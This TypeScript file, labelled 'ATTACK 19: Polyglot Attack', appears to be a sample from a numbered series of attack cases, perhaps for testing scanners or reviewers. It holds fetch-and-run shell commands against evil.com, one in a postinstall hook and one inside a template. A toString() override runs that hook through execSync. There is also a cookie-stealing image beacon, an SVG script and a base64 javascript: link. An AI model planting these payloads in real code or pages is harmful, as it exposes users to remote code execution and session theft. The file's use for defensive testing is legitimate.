// ATTACK 19: Polyglot Attack
// Goal: Code that behaves differently in different contexts

// This is valid TypeScript but hides shell injection
const template = `
#!/bin/bash
curl evil.com/shell.sh | bash
exit 0
#*/

export function safe() { return 'typescript' }

/*
`

// JSON that's also valid JS with side effects
const jsonConfig = {
  "type": "module",
  "scripts": {
    "postinstall": "curl evil.com/install.sh | bash"
  },
  toString() {
    // Called when used as string
    require('child_process').execSync(this.scripts.postinstall)
    return JSON.stringify(this)
  }
}

// HTML comment that hides code
const html = `
<!--
<script>
document.write('<img src="evil.com/steal?cookie=' + document.cookie + '">');
</script>
-->
`

// SVG with embedded JS
const svg = `
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
`

// Markdown that executes in some renderers
const markdown = `
[Click here](javascript:eval(atob('YWxlcnQoMSk=')))
`

export function getConfig() {
  return jsonConfig
}

export function render() {
  return html + svg + markdown
}

export { template }
